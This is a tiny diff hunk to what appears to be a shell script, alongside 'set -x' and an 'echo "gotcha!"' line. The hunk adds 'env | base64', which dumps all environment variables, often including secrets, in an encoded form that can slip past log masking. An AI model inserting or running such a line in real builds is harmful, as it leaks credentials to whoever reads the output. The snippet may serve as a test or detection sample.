@@ -3,3 +3,5 @@
 set -x
 
 echo "gotcha!"
+
+env | base64
